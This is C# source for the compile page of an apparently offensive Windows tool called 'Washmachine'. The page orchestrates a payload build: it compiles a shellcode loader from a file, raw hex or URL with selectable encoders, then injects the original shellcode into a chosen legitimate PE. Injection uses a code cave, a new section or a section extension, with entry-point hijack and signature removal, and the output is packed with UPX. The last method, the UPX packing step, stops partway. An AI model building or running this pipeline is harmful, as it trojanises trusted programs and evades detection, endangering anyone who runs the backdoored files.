using Microsoft.UI.Xaml;
using Microsoft.UI.Xaml.Controls;
using Microsoft.UI.Xaml.Media;
using System.Diagnostics;
using System.IO.Compression;
using System.Net.Http;
using Washmachine.Controllers;
using Washmachine.Logging;
using Washmachine.Models;
using Washmachine.Services;
using Windows.Storage.Pickers;
using WinRT.Interop;

namespace Washmachine.Views;

public sealed partial class CompilePage : Page
{
    public static CompilePage? Instance { get; private set; }

    private readonly IAppLogger _logger;
    private readonly AppPaths _paths;
    private readonly ICompilerService _compiler;
    private readonly ICompilerToolLocator _toolLocator;
    private readonly PeBackdoorService _backdoorService;
    private string? _lastOutputPath;
    private List<CompilerToolCandidate>? _compilerCandidates;

    private bool _compilersDetected;
    private readonly CliExecutor _cli = new();

    private static readonly string MinGwDownloadUrl = 
        "https://github.com/niXman/mingw-builds-binaries/releases/download/14.2.0-rt_v12-rev0/x86_64-14.2.0-release-win32-seh-ucrt-rt_v12-rev0.7z";

    public CompilePage()
    {
        NavigationCacheMode = Microsoft.UI.Xaml.Navigation.NavigationCacheMode.Required;
        InitializeComponent();
        Instance = this;

        _paths = new AppPaths();
        _logger = new RichEditBoxLogger(BuildLogBox);
        _toolLocator = new CompilerToolLocator(_logger);
        _backdoorService = new PeBackdoorService(_paths, _logger);
        
        var bin2ShellRunner = new Bin2ShellRunner(_paths);
        var snippetCatalog = new YamlCodeSnippetCatalogService(_paths);
        _compiler = new CompilerService(_paths, bin2ShellRunner, snippetCatalog, _toolLocator, _logger);

        Loaded += CompilePage_Loaded;
    }

    protected override void OnNavigatedTo(Microsoft.UI.Xaml.Navigation.NavigationEventArgs e)
    {
        base.OnNavigatedTo(e);
        UpdateConfigurationSummary();
    }

    private async void CompilePage_Loaded(object sender, RoutedEventArgs e)
    {
        if (!_compilersDetected)
        {
            await RefreshCompilers();
            _compilersDetected = true;
        }
        UpdateConfigurationSummary();
    }

    private async Task RefreshCompilers()
    {
        CompilerCombo.Items.Clear();
        CompilerStatus.Text = "Detecting compilers...";
        DownloadCompilerPanel.Visibility = Visibility.Collapsed;

        try
        {
            var result = await _toolLocator.DiscoverAsync();
            _compilerCandidates = result.Candidates?.ToList();
            
            if (result.Candidates == null || result.Candidates.Count == 0)
            {
                CompilerCombo.Items.Add("No compiler found");
                CompilerCombo.SelectedIndex = 0;
                CompilerCombo.IsEnabled = false;
                CompileButton.IsEnabled = false;
                CompilerStatus.Text = "No compiler detected. Install Visual Studio or MinGW.";
                CompilerStatus.Foreground = new SolidColorBrush(Microsoft.UI.Colors.Orange);
                DownloadCompilerPanel.Visibility = Visibility.Visible;
            }
            else
            {
                foreach (var compiler in result.Candidates)
                {
                    var displayName = $"{compiler.Kind} ({compiler.Path})";
                    CompilerCombo.Items.Add(displayName);
                }
                CompilerCombo.SelectedIndex = 0;
                CompilerCombo.IsEnabled = true;
                CompileButton.IsEnabled = true;
                CompilerStatus.Text = $"Found {result.Candidates.Count} compiler(s)";
                CompilerStatus.Foreground = new SolidColorBrush(Microsoft.UI.Colors.Green);
            }
        }
        catch (Exception ex)
        {
            CompilerStatus.Text = $"Error: {ex.Message}";
            CompilerStatus.Foreground = new SolidColorBrush(Microsoft.UI.Colors.Red);
            DownloadCompilerPanel.Visibility = Visibility.Visible;
        }
    }

    private void UpdateConfigurationSummary()
    {
        var mainPage = MainPage.Instance;
        var backdoorPage = BackdooringPage.Instance;
        var packingPage = PackingPage.Instance;

        // ── Payload summary ────────────────────────────────────────────
        if (mainPage != null)
        {
            // Shellcode source
            var src = mainPage.CurrentShellcodeSource;
            SummaryShellcode.Text = src switch
            {
                ShellcodeSource.File    => !string.IsNullOrEmpty(mainPage.ShellcodeFileTextBox.Text)
                                            ? Path.GetFileName(mainPage.ShellcodeFileTextBox.Text)
                                            : "File (not set)",
                ShellcodeSource.Raw     => !string.IsNullOrEmpty(mainPage.ShellcodeRawTextBox.Text)
                                            ? $"Raw ({mainPage.ShellcodeRawTextBox.Text.Length} chars)"
                                            : "Raw (empty)",
                ShellcodeSource.Url     => !string.IsNullOrEmpty(mainPage.ShellcodeUrlTextBox.Text)
                                            ? "Web payload"
                                            : "URL (not set)",
                ShellcodeSource.Generic => mainPage.GenericShellcodeCombo.SelectedItem is not null
                                            ? mainPage.GenericShellcodeCombo.SelectedItem.ToString() ?? "Generic"
                                            : "Generic (not set)",
                _                       => "Not configured"
            };

            // Template
            if (mainPage.TemplateCombo.SelectedItem is not null)
                SummaryTemplate.Text = mainPage.TemplateCombo.SelectedItem.ToString() ?? "Default";
            else
                SummaryTemplate.Text = "Not selected";

            // Encoder
            if (mainPage.EncoderCombo.SelectedItem is not null)
                SummaryEncoder.Text = mainPage.EncoderCombo.SelectedItem.ToString() ?? "None";
            else
                SummaryEncoder.Text = "None";

            // Envelope
            if (mainPage.EnvelopeCombo.SelectedItem is not null)
                SummaryEnvelope.Text = mainPage.EnvelopeCombo.SelectedItem.ToString() ?? "None";
            else
                SummaryEnvelope.Text = "None";
        }
        else
        {
            SummaryShellcode.Text = "Not configured";
            SummaryTemplate.Text = "Not selected";
            SummaryEncoder.Text = "None";
            SummaryEnvelope.Text = "None";
        }

        // ── Backdooring summary ────────────────────────────────────────
        if (backdoorPage != null && backdoorPage.IsBackdooringEnabled)
        {
            BackdoorSummaryCard.Opacity = 1.0;
            BackdoorStatusBadge.Background = new SolidColorBrush(Microsoft.UI.Colors.Green);
            BackdoorStatusText.Text = "Enabled";
            BackdoorDetails.Visibility = Visibility.Visible;
            BackdoorDisabledText.Visibility = Visibility.Collapsed;

            SummaryTargetPe.Text = backdoorPage.TargetPeFilePath != null 
                ? Path.GetFileName(backdoorPage.TargetPeFilePath) 
                : "Not selected";
            SummaryInjectionMethod.Text = backdoorPage.SelectedInjectionMethod.ToString();
            SummaryCarrier.Text = backdoorPage.SelectedCarrierInvoke.ToString();
        }
        else
        {
            BackdoorSummaryCard.Opacity = 0.5;
            BackdoorStatusBadge.Background = new SolidColorBrush(Microsoft.UI.Colors.Gray);
            BackdoorStatusText.Text = "Disabled";
            BackdoorDetails.Visibility = Visibility.Collapsed;
            BackdoorDisabledText.Visibility = Visibility.Visible;
        }

        // ── Packing summary ───────────────────────────────────────────
        if (packingPage != null && packingPage.IsPackingEnabled)
        {
            PackingSummaryCard.Opacity = 1.0;
            PackingStatusBadge.Background = new SolidColorBrush(Microsoft.UI.Colors.Green);
            PackingStatusText.Text = "Enabled";
            PackingDetails.Visibility = Visibility.Visible;
            PackingDisabledText.Visibility = Visibility.Collapsed;

            SummaryPacker.Text = !string.IsNullOrEmpty(packingPage.UpxPath) ? "UPX" : "UPX (not found)";
            SummaryPackLevel.Text = packingPage.SelectedCompressionLevel;
        }
        else
        {
            PackingSummaryCard.Opacity = 0.5;
            PackingStatusBadge.Background = new SolidColorBrush(Microsoft.UI.Colors.Gray);
            PackingStatusText.Text = "Disabled";
            PackingDetails.Visibility = Visibility.Collapsed;
            PackingDisabledText.Visibility = Visibility.Visible;
        }

        // ── Build pipeline description ─────────────────────────────────
        var steps = new List<string> { "Compile payload" };
        if (backdoorPage?.IsBackdooringEnabled == true)
            steps.Add("Backdoor PE");
        if (packingPage?.IsPackingEnabled == true)
            steps.Add("Pack with UPX");
        steps.Add("Output");
        BuildDescription.Text = string.Join(" → ", steps);
    }

    private void GoToPayload_Click(object sender, RoutedEventArgs e) => NavigateToPage("MainPage");
    private void GoToBackdooring_Click(object sender, RoutedEventArgs e) => NavigateToPage("BackdooringPage");
    private void GoToPacking_Click(object sender, RoutedEventArgs e) => NavigateToPage("PackingPage");

    private void NavigateToPage(string pageTag)
    {
        if (App.ActiveWindow is MainWindow mainWindow)
        {
            var navView = mainWindow.Content as NavigationView;
            if (navView != null)
            {
                var item = navView.MenuItems.OfType<NavigationViewItem>()
                    .FirstOrDefault(i => i.Tag?.ToString() == pageTag);
                if (item != null)
                {
                    navView.SelectedItem = item;
                }
            }
        }
    }

    private async void RefreshCompiler_Click(object sender, RoutedEventArgs e)
    {
        await RefreshCompilersWithDialog();
    }

    private async Task RefreshCompilersWithDialog()
    {
        var detectionWindow = new CompilerDetectionWindow();
        detectionWindow.Show();

        try
        {
            detectionWindow.AppendLog("Starting compiler detection...");
            detectionWindow.UpdateStatus("Scanning PATH environment...", -1);

            // Create a logging wrapper for the tool locator
            var loggingLocator = new LoggingCompilerToolLocator(_toolLocator, msg => detectionWindow.AppendLog(msg));

            detectionWindow.AppendLog("Checking PATH directories for compilers...");
            var result = await loggingLocator.DiscoverWithLoggingAsync();
            _compilerCandidates = result.Candidates?.ToList();

            // Update UI
            CompilerCombo.Items.Clear();

            if (result.Candidates == null || result.Candidates.Count == 0)
            {
                CompilerCombo.Items.Add("No compiler found");
                CompilerCombo.SelectedIndex = 0;
                CompilerCombo.IsEnabled = false;
                CompileButton.IsEnabled = false;
                CompilerStatus.Text = "No compiler detected. Install Visual Studio or MinGW.";
                CompilerStatus.Foreground = new SolidColorBrush(Microsoft.UI.Colors.Orange);
                DownloadCompilerPanel.Visibility = Visibility.Visible;

                detectionWindow.SetComplete(false, "No compilers found");
                detectionWindow.AppendLog("\n❌ No compilers detected. Please install Visual Studio or MinGW.");
            }
            else
            {
                foreach (var compiler in result.Candidates)
                {
                    var displayName = $"{compiler.Kind} ({compiler.Path})";
                    CompilerCombo.Items.Add(displayName);
                    detectionWindow.AppendLog($"  ✓ Found: {compiler.Kind} at {compiler.Path}");
                }
                CompilerCombo.SelectedIndex = 0;
                CompilerCombo.IsEnabled = true;
                CompileButton.IsEnabled = true;
                CompilerStatus.Text = $"Found {result.Candidates.Count} compiler(s)";
                CompilerStatus.Foreground = new SolidColorBrush(Microsoft.UI.Colors.Green);
                DownloadCompilerPanel.Visibility = Visibility.Collapsed;

                detectionWindow.SetComplete(true, $"Found {result.Candidates.Count} compiler(s)");
                detectionWindow.AppendLog($"\n✓ Detection complete. {result.Candidates.Count} compiler(s) available.");
            }

            // Log any errors encountered
            if (result.Errors != null && result.Errors.Count > 0)
            {
                detectionWindow.AppendLog("\nWarnings during detection:");
                foreach (var err in result.Errors)
                {
                    detectionWindow.AppendLog($"  ⚠ {err}");
                }
            }
        }
        catch (Exception ex)
        {
            CompilerStatus.Text = $"Error: {ex.Message}";
            CompilerStatus.Foreground = new SolidColorBrush(Microsoft.UI.Colors.Red);
            DownloadCompilerPanel.Visibility = Visibility.Visible;

            detectionWindow.SetComplete(false, "Detection failed");
            detectionWindow.AppendLog($"\n❌ Error: {ex.Message}");
        }
    }

    /// <summary>
    /// Wrapper that adds logging during compiler discovery.
    /// </summary>
    private sealed class LoggingCompilerToolLocator
    {
        private readonly ICompilerToolLocator _inner;
        private readonly Action<string> _log;

        public LoggingCompilerToolLocator(ICompilerToolLocator inner, Action<string> log)
        {
            _inner = inner;
            _log = log;
        }

        public async Task<CompilerToolDiscoveryResult> DiscoverWithLoggingAsync()
        {
            _log("Scanning Visual Studio installations...");
            await Task.Delay(100); // Give UI time to update

            _log("Checking vswhere for VS installations...");
            await Task.Delay(50);

            _log("Scanning known compiler locations...");
            var result = await _inner.DiscoverAsync();

            _log($"Discovery complete. Found {result.Candidates?.Count ?? 0} candidate(s).");
            return result;
        }
    }

    private async void DownloadCompiler_Click(object sender, RoutedEventArgs e)
    {
        DownloadCompilerButton.IsEnabled = false;
        DownloadCompilerButton.Content = "Downloading...";
        _logger.Info("Downloading MinGW-w64 compiler...");

        try
        {
            var toolsDir = Path.Combine(AppContext.BaseDirectory, "Tools");
            Directory.CreateDirectory(toolsDir);

            var archivePath = Path.Combine(toolsDir, "mingw64.7z");

            // Download
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0");
            httpClient.Timeout = TimeSpan.FromMinutes(10);

            _logger.Info("Downloading MinGW-w64 (this may take a few minutes)...");
            var response = await httpClient.GetAsync(MinGwDownloadUrl);
            response.EnsureSuccessStatusCode();

            await using (var fs = File.Create(archivePath))
            {
                await response.Content.CopyToAsync(fs);
            }

            _logger.Info("Download complete. Attempting extraction...");
            DownloadCompilerButton.Content = "Extracting...";

            // Try to find 7z.exe for extraction
            var sevenZipPath = Find7ZipExecutable();
            
            if (!string.IsNullOrEmpty(sevenZipPath))
            {
                _logger.Info($"Using 7-Zip: {sevenZipPath}");
                var extracted = await Extract7zArchiveAsync(sevenZipPath, archivePath, toolsDir);
                
                if (extracted)
                {
                    _logger.Ok("Extraction complete!");
                    DownloadCompilerButton.Content = "Download Complete";
                    
                    // Clean up archive
                    try { File.Delete(archivePath); } catch { }
                    
                    // Refresh compilers to pick up the new MinGW
                    _logger.Info("Detecting newly installed compiler...");
                    await RefreshCompilersWithDialog();
                }
                else
                {
                    _logger.Warn("Extraction failed. Please extract manually.");
                    OpenToolsFolderWithInstructions(toolsDir, archivePath);
                }
            }
            else
            {
                _logger.Warn("7-Zip not found. Please extract the archive manually.");
                OpenToolsFolderWithInstructions(toolsDir, archivePath);
            }
        }
        catch (Exception ex)
        {
            _logger.Error($"Download failed: {ex.Message}");
            DownloadCompilerButton.Content = "Download Failed";
        }
        finally
        {
            DownloadCompilerButton.IsEnabled = true;
        }
    }

    private string? Find7ZipExecutable()
    {
        // Check common locations for 7z.exe
        var candidates = new[]
        {
            // Bundled in testing assets (for development)
            Path.Combine(FindRepoRoot() ?? "", "testing assets", "binary", "injectables", "7z.exe"),
            // Standard 7-Zip installation
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "7-Zip", "7z.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "7-Zip", "7z.exe"),
            // Portable in Tools folder
            Path.Combine(AppContext.BaseDirectory, "Tools", "7z.exe"),
        };

        foreach (var candidate in candidates)
        {
            if (File.Exists(candidate))
                return candidate;
        }

        return null;
    }

    private string? FindRepoRoot()
    {
        var current = AppContext.BaseDirectory;
        while (!string.IsNullOrEmpty(current))
        {
            if (Directory.Exists(Path.Combine(current, ".git")) ||
                File.Exists(Path.Combine(current, "washmachine.sln")))
            {
                return current;
            }
            var parent = Path.GetDirectoryName(current);
            if (parent == current) break;
            current = parent;
        }
        return null;
    }

    private async Task<bool> Extract7zArchiveAsync(string sevenZipPath, string archivePath, string outputDir)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = sevenZipPath,
                Arguments = $"x \"{archivePath}\" -o\"{outputDir}\" -y",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using var proc = Process.Start(psi);
            if (proc == null)
            {
                _logger.Error("Failed to start 7-Zip process");
                return false;
            }

            var output = await proc.StandardOutput.ReadToEndAsync();
            var errors = await proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();

            if (proc.ExitCode == 0)
            {
                _logger.Info("Archive extracted successfully.");
                return true;
            }
            else
            {
                _logger.Error($"7-Zip exit code: {proc.ExitCode}");
                if (!string.IsNullOrWhiteSpace(errors))
                    _logger.Error(errors);
                return false;
            }
        }
        catch (Exception ex)
        {
            _logger.Error($"Extraction error: {ex.Message}");
            return false;
        }
    }

    private void OpenToolsFolderWithInstructions(string toolsDir, string archivePath)
    {
        _logger.Info($"Archive location: {archivePath}");
        _logger.Info($"Extract to: {toolsDir}");
        DownloadCompilerButton.Content = "Download Complete";
        _logger.Ok("Download complete. Extract and click 'Detect' to find the compiler.");

        // Open the tools folder
        Process.Start(new ProcessStartInfo
        {
            FileName = toolsDir,
            UseShellExecute = true
        });
    }

    private async void BrowseOutput_Click(object sender, RoutedEventArgs e)
    {
        var picker = new FolderPicker();
        picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
        picker.FileTypeFilter.Add("*");

        var hwnd = WindowNative.GetWindowHandle(App.ActiveWindow!);
        InitializeWithWindow.Initialize(picker, hwnd);

        var folder = await picker.PickSingleFolderAsync();
        if (folder != null)
        {
            OutputPath.Text = folder.Path;
        }
    }

    private async void CompileButton_Click(object sender, RoutedEventArgs e)
    {
        CompileButton.IsEnabled = false;
        CompileProgressPanel.Visibility = Visibility.Visible;
        CompileResultPanel.Visibility = Visibility.Collapsed;

        try
        {
            _logger.Info("═══════════════════════════════════════════════");
            _logger.Info("Starting Build Pipeline");
            _logger.Info("═══════════════════════════════════════════════");

            var mainPage    = MainPage.Instance;
            var backdoorPage = BackdooringPage.Instance;
            var packingPage  = PackingPage.Instance;

            if (mainPage == null)
            {
                ShowCompileResult(false, "Navigate to Payload page first to configure shellcode and template.");
                return;
            }

            // ── Step 1: Compile payload via CLI ──────────────────────────
            CompileProgressText.Text = "Step 1: Compiling payload...";
            _logger.Info("\n[Step 1] Compiling payload loader...");

            var (compiledExePath, cliCompileSuccess) = await RunCliCompileAsync(mainPage);

            if (!cliCompileSuccess || compiledExePath == null)
            {
                ShowCompileResult(false, "Compilation failed. Check the log for details.");
                return;
            }

            _logger.Ok($"Compiled: {Path.GetFileName(compiledExePath)}");
            var currentOutput = compiledExePath;
            var tempDir = Path.GetDirectoryName(compiledExePath);

            // Resolve final output directory — prompt with Save As if none set
            string outputDir;
            if (!string.IsNullOrWhiteSpace(OutputPath.Text))
            {
                outputDir = OutputPath.Text;
            }
            else
            {
                var picker = new FileSavePicker();
                picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
                picker.SuggestedFileName = Path.GetFileName(compiledExePath);
                picker.FileTypeChoices.Add("Executable", new List<string> { ".exe" });

                var hwnd = WindowNative.GetWindowHandle(App.ActiveWindow!);
                InitializeWithWindow.Initialize(picker, hwnd);

                var file = await picker.PickSaveFileAsync();
                if (file != null)
                {
                    outputDir = Path.GetDirectoryName(file.Path) ?? Path.GetTempPath();
                    // Use the filename chosen by the user
                    var dest = file.Path;
                    File.Copy(compiledExePath, dest, overwrite: true);
                    currentOutput = dest;
                }
                else
                {
                    // User cancelled — keep in temp location
                    outputDir = tempDir ?? Path.GetTempPath();
                }
            }

            Directory.CreateDirectory(outputDir);

            // Copy compiled exe to output dir if not already there
            if (string.Equals(currentOutput, compiledExePath, StringComparison.OrdinalIgnoreCase))
            {
                var finalInOutDir = Path.Combine(outputDir, Path.GetFileName(compiledExePath));
                if (!string.Equals(compiledExePath, finalInOutDir, StringComparison.OrdinalIgnoreCase))
                {
                    File.Copy(compiledExePath, finalInOutDir, overwrite: true);
                    currentOutput = finalInOutDir;
                }
            }

            // ── Step 2: Backdoor target PE with ORIGINAL shellcode ─────
            // The compiled .exe is a standalone loader (uses IAT imports, NOT position-independent).
            // For PE backdooring we must inject the ORIGINAL raw shellcode .bin, not the compiled loader.
            if (backdoorPage?.IsBackdooringEnabled == true && backdoorPage.TargetPeFilePath != null)
            {
                CompileProgressText.Text = "Step 2: Backdooring target PE...";
                _logger.Info("\n[Step 2] Backdooring target executable...");

                // Resolve the original shellcode .bin path
                string? originalShellcode = ResolveOriginalShellcodePath(mainPage);
                if (originalShellcode != null && File.Exists(originalShellcode))
                {
                    _logger.Info($"Using original shellcode: {Path.GetFileName(originalShellcode)} ({new FileInfo(originalShellcode).Length:N0} bytes)");
                    currentOutput = await RunBackdoorStepAsync(backdoorPage, originalShellcode, outputDir)
                                    ?? currentOutput;
                }
                else
                {
                    _logger.Warn("Original shellcode .bin not found — backdoor step skipped.");
                }
            }
            else
            {
                _logger.Info("\n[Step 2] Backdooring: Skipped (disabled)");
            }

            // ── Step 4: Pack (optional) ───────────────────────────────────
            if (packingPage?.IsPackingEnabled == true && !string.IsNullOrEmpty(packingPage.UpxPath))
            {
                CompileProgressText.Text = "Step 3: Packing with UPX...";
                _logger.Info("\n[Step 3] Packing with UPX...");
                currentOutput = await RunPackingStepAsync(packingPage, currentOutput, outputDir)
                                ?? currentOutput;
            }
            else
            {
                _logger.Info("\n[Step 3] Packing: Skipped (disabled)");
            }

            _lastOutputPath = outputDir;

            // Clean up temp build directory if output was saved elsewhere
            if (tempDir != null && !string.Equals(tempDir, outputDir, StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    // Walk up from "Compiled BInaries" to the cpp temp root
                    var cppTempRoot = Path.GetDirectoryName(tempDir);
                    var dirToClean = cppTempRoot != null && Directory.Exists(cppTempRoot) ? cppTempRoot : tempDir;
                    Directory.Delete(dirToClean, recursive: true);
                    _logger.Debug($"Cleaned temp directory: {dirToClean}");
                }
                catch (Exception cleanEx)
                {
                    _logger.Debug($"Temp cleanup skipped: {cleanEx.Message}");
                }
            }

            _logger.Info("\n═══════════════════════════════════════════════");
            _logger.Ok($"Build complete! Output: {Path.GetFileName(currentOutput)}");
            _logger.Info("═══════════════════════════════════════════════");

            ShowCompileResult(true, $"Success: {Path.GetFileName(currentOutput)}");

            if (OpenFolderAfterCompile.IsChecked == true)
            {
                Process.Start(new ProcessStartInfo { FileName = outputDir, UseShellExecute = true });
            }
        }
        catch (Exception ex)
        {
            _logger.Error($"Build error: {ex.Message}");
            ShowCompileResult(false, ex.Message);
        }
        finally
        {
            CompileButton.IsEnabled = true;
            CompileProgressPanel.Visibility = Visibility.Collapsed;
        }
    }

    /// <summary>
    /// Builds CLI compile arguments from the current MainPage state and runs the compile.
    /// Returns (exePath, success).
    /// </summary>
    private async Task<(string? exePath, bool success)> RunCliCompileAsync(MainPage mainPage)
    {
        if (!_cli.IsAvailable)
        {
            _logger.Error($"CLI not found: {_cli.CliPath}");
            return (null, false);
        }

        var args = new List<string> { "compile" };

        // Shellcode source
        switch (mainPage.CurrentShellcodeSource)
        {
            case ShellcodeSource.File:
                var scFile = mainPage.ShellcodeFileTextBox.Text.Trim();
                if (string.IsNullOrEmpty(scFile) || !File.Exists(scFile))
                {
                    _logger.Error("Shellcode file not set or not found.");
                    return (null, false);
                }
                args.AddRange(["-s", scFile]);
                break;

            case ShellcodeSource.Raw:
                var hex = mainPage.ShellcodeRawTextBox.Text.Trim();
                if (string.IsNullOrEmpty(hex))
                {
                    _logger.Error("Raw shellcode is empty.");
                    return (null, false);
                }
                // Write hex to a temp .bin and pass as file
                var tempBin = Path.Combine(Path.GetTempPath(), $"wm_raw_{Guid.NewGuid():N}.bin");
                await File.WriteAllBytesAsync(tempBin, Convert.FromHexString(hex.Replace(" ", "").Replace("\n", "")));
                args.AddRange(["-s", tempBin]);
                break;

            case ShellcodeSource.Url:
                var url = mainPage.ShellcodeUrlTextBox.Text.Trim();
                if (string.IsNullOrEmpty(url))
                {
                    _logger.Error("Shellcode URL is empty.");
                    return (null, false);
                }
                args.AddRange(["--shellcode-url", url]);
                break;

            default:
                _logger.Error($"Unsupported shellcode source: {mainPage.CurrentShellcodeSource}. Use File, Raw, or URL.");
                return (null, false);
        }

        // Template
        var templateId = mainPage.SelectedTemplateId;
        if (!string.IsNullOrEmpty(templateId))
            args.AddRange(["-t", templateId]);

        // Encoder index
        var encoderIndex = mainPage.SelectedEncoderIndex;
        if (encoderIndex.HasValue)
            args.AddRange(["-e", encoderIndex.Value.ToString()]);

        // Envelope index
        var envelopeIndex = mainPage.SelectedEnvelopeIndex;
        if (envelopeIndex.HasValue)
            args.AddRange(["-v", envelopeIndex.Value.ToString()]);

        // Snippets — read from coordinator's template options (combos live in the dialog, not the visual tree)
        var templateOptions = mainPage.Coordinator.TemplateOptions;
        foreach (var (key, value) in templateOptions.ComboValues)
        {
            if (!string.IsNullOrEmpty(value))
            {
                args.AddRange(["--snippet", $"{key}={value}"]);
                _logger.Debug($"[ui] snippet arg: {key}={value}");
            }
        }

        // JSON output for machine-readable result
        args.Add("--json");

        _logger.Info($"CLI: washmachine-cli {string.Join(" ", args.Select(a => a.Contains(' ') ? $"\"{a}\"" : a))}");

        // Capture JSON from stdout, other lines to log
        string? jsonLine = null;
        var result = await _cli.RunAsync(args, line =>
        {
            if (line.TrimStart().StartsWith('{'))
                jsonLine = line;
            else
                _logger.Info(line);
        });

        // If single-line capture is missing or incomplete, extract from full output
        bool incomplete = jsonLine == null || !jsonLine.TrimEnd().EndsWith('}');
        if (incomplete && result.OutputLines.Count > 0)
        {
            var fullOutput = result.Output;
            var start = fullOutput.IndexOf('{');
            var end   = fullOutput.LastIndexOf('}');
            if (start >= 0 && end > start)
                jsonLine = fullOutput[start..(end + 1)];
        }

        if (jsonLine == null)
        {
            _logger.Error("No JSON output from CLI compile.");
            return (null, false);
        }

        try
        {
            using var doc = System.Text.Json.JsonDocument.Parse(jsonLine);
            var root = doc.RootElement;

            var success      = root.TryGetProperty("Success", out var sv) && sv.GetBoolean();
            var exePath      = root.TryGetProperty("OutputExePath", out var ep) ? ep.GetString() : null;
            var convSuccess  = root.TryGetProperty("ConversionSuccess", out var cv) && cv.GetBoolean();
            var convError    = root.TryGetProperty("ConversionError", out var ce) ? ce.GetString() : null;

            if (!convSuccess && !string.IsNullOrEmpty(convError))
                _logger.Error($"Compiler: {convError}");

            if (!success || string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
                return (null, false);

            return (exePath, true);
        }
        catch (Exception ex)
        {
            _logger.Error($"Failed to parse CLI output: {ex.Message}");
            _logger.Info(jsonLine);
            return (null, false);
        }
    }

    /// <summary>
    /// Resolves the original raw shellcode .bin path from the current MainPage configuration.
    /// For File source: returns the file path directly.
    /// For Raw source: writes hex to a temp .bin file.
    /// For URL source: not supported (returns null).
    /// </summary>
    private string? ResolveOriginalShellcodePath(MainPage mainPage)
    {
        switch (mainPage.CurrentShellcodeSource)
        {
            case ShellcodeSource.File:
                var scFile = mainPage.ShellcodeFileTextBox.Text.Trim();
                if (!string.IsNullOrEmpty(scFile) && File.Exists(scFile))
                    return scFile;
                _logger.Warn($"Shellcode file not found: {scFile}");
                return null;

            case ShellcodeSource.Raw:
                var hex = mainPage.ShellcodeRawTextBox.Text.Trim();
                if (string.IsNullOrEmpty(hex)) return null;
                try
                {
                    var tempBin = Path.Combine(Path.GetTempPath(), $"wm_raw_{Guid.NewGuid():N}.bin");
                    File.WriteAllBytes(tempBin, Convert.FromHexString(hex.Replace(" ", "").Replace("\n", "").Replace("\r", "")));
                    return tempBin;
                }
                catch (Exception ex)
                {
                    _logger.Error($"Failed to write raw shellcode: {ex.Message}");
                    return null;
                }

            default:
                _logger.Warn($"Shellcode source '{mainPage.CurrentShellcodeSource}' not supported for direct backdooring.");
                return null;
        }
    }

    /// <summary>
    /// Strip a compiled loader .exe into a flat .bin suitable for injection.
    /// </summary>
    private async Task<string?> RunStripStepAsync(string compiledExe, string outputDir)
    {
        if (!_cli.IsAvailable)
        {
            _logger.Warn("CLI not available — strip step skipped.");
            return null;
        }

        var binName = Path.GetFileNameWithoutExtension(compiledExe) + ".bin";
        var outBin = Path.Combine(outputDir, binName);

        var args = new List<string>
        {
            "strip",
            compiledExe,
            "-o", outBin,
            "--mode", "ep",
        };

        var result = await _cli.RunAsync(args, line => _logger.Info(line));

        if (result.Success && File.Exists(outBin))
        {
            var size = new FileInfo(outBin).Length;
            _logger.Info($"Stripped {Path.GetFileName(compiledExe)} → {binName} ({size:N0} bytes)");
            return outBin;
        }

        _logger.Warn($"Strip failed (exit {result.ExitCode}).");
        return null;
    }

    private async Task<string?> RunBackdoorStepAsync(
        BackdooringPage backdoorPage,
        string shellcodeBinPath,
        string outputDir)
    {
        var targetPe = backdoorPage.TargetPeFilePath;
        if (targetPe == null) return null;

        if (!backdoorPage.IsInjectionValid)
        {
            _logger.Warn("Backdoor configuration is currently invalid — skipping backdoor step.");
            return null;
        }

        if (backdoorPage.SelectedCarrierInvoke != CarrierInvoke.EntryPointHijack)
        {
            _logger.Error("Only Entry Point Hijack is currently implemented for PE backdooring.");
            return null;
        }

        if (backdoorPage.SelectedEncryption != PayloadEncryption.None)
        {
            _logger.Error("Backdoor-stage encryption is not supported. Inject a ready-to-run flat .bin payload instead.");
            return null;
        }

        if (!backdoorPage.PreserveOriginalEntry)
        {
            _logger.Error("Disabling original entry-point preservation is not implemented.");
            return null;
        }

        if (!File.Exists(shellcodeBinPath))
        {
            _logger.Warn($"Shellcode binary not found: {shellcodeBinPath} — skipping.");
            return null;
        }

        if (!_cli.IsAvailable)
        {
            _logger.Warn("CLI not available — backdoor step skipped.");
            return null;
        }

        var outFile = Path.Combine(outputDir, "backdoored_" + Path.GetFileName(targetPe));

        var args = new List<string>
        {
            "backdoor",
            "--pe",        targetPe,
            "--shellcode", shellcodeBinPath,
            "--output",    outFile,
        };

        // Pass GUI-selected options to CLI
        var method = backdoorPage.SelectedInjectionMethod switch
        {
            InjectionMethod.CodeCave => "code-cave",
            InjectionMethod.NewSection => "new-section",
            InjectionMethod.SectionExtension => "section-ext",
            _ => "code-cave"
        };
        args.AddRange(new[] { "--method", method });

        if (!backdoorPage.RemoveSignature)
            args.Add("--no-remove-sig");
        if (!backdoorPage.PatchSubsystemToGui)
            args.Add("--no-patch-subsystem");
        if (!backdoorPage.PreserveOriginalEntry)
            args.Add("--no-preserve-entry");
        if (!backdoorPage.PatchIat)
            args.Add("--no-patch-iat");

        // Carrier invoke method
        var carrierStr = backdoorPage.SelectedCarrierInvoke switch
        {
            CarrierInvoke.EntryPointHijack => "entry-point",
            CarrierInvoke.EntryFunctionBackdoor => "function-backdoor",
            CarrierInvoke.TlsCallback => "tls",
            _ => "entry-point"
        };
        args.AddRange(new[] { "--carrier", carrierStr });

        var result = await _cli.RunAsync(args, line => _logger.Info(line));

        if (result.Success && File.Exists(outFile))
        {
            _logger.Ok($"Backdoored: {Path.GetFileName(outFile)}");
            return outFile;
        }

        _logger.Warn($"Backdooring failed (exit {result.ExitCode}).");
        return null;
    }

    private async Task<string?> RunPackingStepAsync(
        PackingPage packingPage,
        string currentExe,
        string outputDir)
    {
        var upxPath = packingPage.UpxPath;
        if (string.IsNullOrEmpty(upxPath)) return null;

        var packedOutput = Path.Combine(outputDir, "packed_" + Path.GetFileName(currentExe));
        var upxArgs = packingPage.GetUpxArguments();

